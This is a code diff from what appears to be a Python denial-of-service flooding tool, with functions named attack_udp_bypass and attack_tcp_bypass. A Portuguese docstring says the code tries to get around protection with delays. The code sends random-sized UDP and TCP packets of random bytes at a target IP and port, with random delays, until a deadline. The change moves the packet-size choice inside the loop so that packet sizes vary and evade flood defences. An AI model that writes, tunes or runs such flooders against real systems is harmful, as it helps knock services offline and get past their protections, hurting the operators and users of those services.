@@ -61,6 +61,7 @@ def attack_udp_bypass(ip, port, secs):
     PACKET_SIZES = [64, 128, 256, 512, 1024]
     DELAY_RANGE = (0.05, 0.2)
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
     while time.time() < secs:
             packet_size = random.choice(PACKET_SIZES) 
             packet = random._urandom(packet_size)
@@ -72,8 +73,9 @@ def attack_udp_bypass(ip, port, secs):
 def attack_tcp_bypass(ip, port, secs):
     """Tenta contornar proteção adicionando delays."""
     PACKET_SIZES = [64, 128, 256, 512, 1024]
-    packet_size = random.choice(PACKET_SIZES) 
+    
     while time.time() < secs:
+        packet_size = random.choice(PACKET_SIZES) 
         packet = random._urandom(packet_size)
 
         DELAYS = (0.05, 0.5)
